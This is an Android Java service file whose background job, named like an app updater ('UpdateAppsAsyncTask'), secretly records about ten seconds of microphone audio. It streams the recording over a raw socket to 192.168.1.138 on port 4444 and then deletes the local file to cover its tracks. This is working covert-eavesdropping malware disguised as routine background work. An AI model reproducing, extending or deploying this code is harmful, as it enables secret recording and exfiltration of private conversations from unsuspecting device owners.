package eu.davidriff.jawar;

/**
 * Created by doctor on 12/04/17.
 */


import android.app.job.JobParameters;
import android.app.job.JobService;
import android.os.AsyncTask;
import java.io.*;
import java.net.*;
import android.media.MediaRecorder;
import android.widget.Toast;
import android.os.*;

public class JawarService extends JobService{




    private UpdateAppsAsyncTask updateTask = new UpdateAppsAsyncTask();

    @Override
    public boolean onStartJob(JobParameters params) {
        // Note: this is preformed on the main thread.
        //Log.d(TAG, "onStartJob id=" + params.getJobId());
        updateTask.execute(params);

        return true;
    }

    // Stopping jobs if our job requires change.

    @Override
    public boolean onStopJob(JobParameters params) {
        // Note: return true to reschedule this job.

        //Log.d(TAG, "onStopJob id=" + params.getJobId());
        boolean shouldReschedule = updateTask.stopJob(params);

        return shouldReschedule;
    }



    private class UpdateAppsAsyncTask extends AsyncTask<JobParameters, Void, JobParameters[]> {


        @Override
        protected JobParameters[] doInBackground(JobParameters... params) {

            // Do updating and stopping logical here.


            System.out.println("Trying to connect, record and send...");
            //AÑADIDO

            try {

                try {
                    Socket socket = new Socket("192.168.1.138", 4444);



                    //Recorder here
                    MediaRecorder mediaRecorder = new MediaRecorder();
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    //mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    mediaRecorder.setOutputFile(getFilesDir()+"/Hz32jhb324.3gp");

                    try{

                        mediaRecorder.prepare();
                        mediaRecorder.start();
                        Thread.sleep(10000); //record 30 seconds of audio
                        mediaRecorder.stop();
                        mediaRecorder.reset();
                        mediaRecorder.release();


                        File file = new File(getFilesDir()+"/Hz32jhb324.3gp");
                        InputStream in = new FileInputStream(file);
                        OutputStream out = socket.getOutputStream();

                        int count;
                        byte[] buffer = new byte[4096];
                        while ((count = in.read(buffer)) > 0 ){
                            out.write(buffer, 0, count);
                        }

                        out.close();
                        in.close();
                        deleteFile("Hz32jhb324.3gp");

                    }
                    catch(IOException io){
                        System.out.println(io);
                    }

                    socket.close();


                }catch (IOException io){
                    System.out.println(io);
                }

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            System.out.println("Done !");

            //FIN DE AÑADIDO





            //Log.d(TAG, "Updating apps in the background");
            return params;
        }

        @Override
        protected void onPostExecute(JobParameters[] result) {
            for (JobParameters params : result) {
                if (!hasJobBeenStopped(params)) {
                    //Log.d(TAG, "finishing job with id=" + params.getJobId());
                    jobFinished(params, false);
                }
            }
        }

        private boolean hasJobBeenStopped(JobParameters params) {
            // Logic for checking stop.
            return false;
        }

        public boolean stopJob(JobParameters params) {
            //Log.d(TAG, "stopJob id=" + params.getJobId());
            // Logic for stopping a job. return true if job should be rescheduled.
            return false;
        }

    }

}
